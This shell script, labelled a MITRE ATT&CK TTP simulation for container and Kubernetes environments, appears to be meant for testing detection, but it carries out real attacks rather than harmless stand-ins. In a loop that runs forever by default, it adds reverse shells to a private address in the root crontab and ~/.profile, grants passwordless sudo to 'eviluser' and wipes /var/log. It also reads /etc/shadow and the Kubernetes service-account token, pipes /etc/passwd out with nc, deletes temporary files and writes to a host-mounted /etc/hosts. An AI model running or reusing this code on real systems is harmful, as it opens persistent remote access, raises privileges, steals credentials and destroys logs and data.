#!/usr/bin/env sh
# MITRE ATT&CK TTP Simulation
# Designed for velocity, detectability, and container/Kubernetes environments.

# ANSI colors for output formatting
GREEN="\033[1;32m"
BLUE="\033[1;34m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
RESET="\033[0m"

# Simulation iterations
ITERATIONS="${ITERATIONS:-0}"  # Default to infinite loop if not set
COUNTER=0

echo "${BLUE}[INFO] Starting MITRE ATT&CK TTP simulation in container environment...${RESET}"

#######################################
# Install Dependencies
#######################################
echo "${BLUE}[INFO] Installing required packages...${RESET}"
apk add --no-cache bash git curl bind-tools mysql-client nc python3 py3-pip gcc musl-dev openssl || \
  echo "${RED}[ERROR] Failed to install some packages${RESET}"

# Helper function for delays
random_sleep() {
    SLEEP_TIME=$((RANDOM % 3 + 1))  # Reduce delay to 1-3 seconds
    sleep "$SLEEP_TIME"
}

#######################################
# Main Simulation Loop
#######################################
while [ "$ITERATIONS" -eq 0 ] || [ $COUNTER -lt "$ITERATIONS" ]; do
    echo "${YELLOW}[CYCLE $COUNTER] Beginning TTP simulation cycle...${RESET}"

    # === Initial Access / Execution Simulation ===
    echo "${GREEN}[+][Execution] Simulating suspicious shell command...${RESET}"
    bash -c "echo 'Suspicious initial access via bash'" &
    random_sleep

    # === Persistence ===
    echo "${GREEN}[+][Persistence] Adding cron job for reverse shell...${RESET}"
    echo "* * * * * root /bin/sh -i >& /dev/tcp/10.0.0.5/4444 0>&1" >> /etc/crontabs/root &
    echo "${GREEN}[+][Persistence] Adding malicious payload to ~/.profile...${RESET}"
    echo "/bin/sh -i >& /dev/tcp/10.0.0.5/5555 0>&1" >> ~/.profile &
    random_sleep

    # === Privilege Escalation ===
    echo "${GREEN}[+][Privilege Escalation] Modifying sudoers for privilege escalation...${RESET}"
    echo "eviluser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers &
    random_sleep

    # === Defense Evasion ===
    echo "${GREEN}[+][Defense Evasion] Clearing logs and hiding sensitive files...${RESET}"
    rm -rf /var/log/* &  # Remove logs
    chmod 600 /etc/shadow &  # Hide credentials
    random_sleep

    # === Credential Access ===
    echo "${GREEN}[+][Credential Access] Dumping credentials from /etc/shadow...${RESET}"
    cat /etc/shadow &  # Dump shadow file
    echo "${GREEN}[+][Credential Access] Searching for passwords in bash history...${RESET}"
    grep -i password ~/.bash_history &  # Search for credentials
    random_sleep

    # === Discovery ===
    echo "${GREEN}[+][Discovery] Gathering system and network information...${RESET}"
    uname -a &  # System info
    ip addr show &  # Network configuration
    ls -alh /etc &  # List files
    ps aux &  # List processes
    random_sleep

    # === Lateral Movement ===
    echo "${GREEN}[+][Lateral Movement] Simulating SSH attempts for lateral movement...${RESET}"
    ssh -o StrictHostKeyChecking=no user@target-machine "echo 'Lateral movement attempt'" || echo "${RED}[!] SSH attempt failed${RESET}" &
    random_sleep

    # === Collection ===
    echo "${GREEN}[+][Collection] Archiving and exfiltrating data...${RESET}"
    tar -czvf collected_data_$COUNTER.tar.gz /etc /home &  # Archive data
    cat /etc/passwd | nc 10.0.0.5 6666 || echo "${RED}[!] Exfiltration failed${RESET}" &
    random_sleep

    # === Impact ===
    echo "${GREEN}[+][Impact] Simulating data destruction and encryption...${RESET}"
    rm -rf /tmp/* /var/tmp/* &  # Data destruction
    tar -cf sensitive_data_$COUNTER.tar /important_dir 2>/dev/null &
    openssl enc -aes-256-cbc -salt -in sensitive_data_$COUNTER.tar -out sensitive_data_$COUNTER.enc -k supersecret &
    random_sleep

    # === Container/Kubernetes Specific TTPs ===
    echo "${GREEN}[+][Container Discovery] Accessing Kubernetes secrets and tokens...${RESET}"
    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null &
    ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null &
    random_sleep

    echo "${GREEN}[+][Kubernetes Enumeration] Listing Kubernetes resources (if kubectl is present)...${RESET}"
    if command -v kubectl >/dev/null; then
        kubectl get pods --all-namespaces 2>/dev/null &
        kubectl get svc --all-namespaces 2>/dev/null &
    else
        echo "${YELLOW}[~] kubectl not found, skipping Kubernetes enumeration.${RESET}"
    fi
    random_sleep

    echo "${GREEN}[+][Container Breakout] Attempting to write to host filesystem...${RESET}"
    if [ -d "/host" ]; then
        echo "Malicious content" >> /host/etc/hosts || echo "${RED}[!] Breakout attempt failed${RESET}" &
    else
        echo "${YELLOW}[~] No host mount found, skipping breakout attempt.${RESET}"
    fi
    random_sleep

    # === End of Cycle ===
    echo "${YELLOW}[CYCLE $COUNTER] Completed TTP simulation cycle.${RESET}"
    COUNTER=$((COUNTER + 1))
    [ "$ITERATIONS" -ne 0 ] && [ $COUNTER -ge "$ITERATIONS" ] && break

    # Optional pause between cycles
    SLEEP_BETWEEN=$((RANDOM % 10 + 5))
    echo "${BLUE}[INFO] Waiting ${SLEEP_BETWEEN}s before next cycle...${RESET}"
    sleep "$SLEEP_BETWEEN"
done

echo "${BLUE}[INFO] MITRE ATT&CK TTP simulation completed.${RESET}"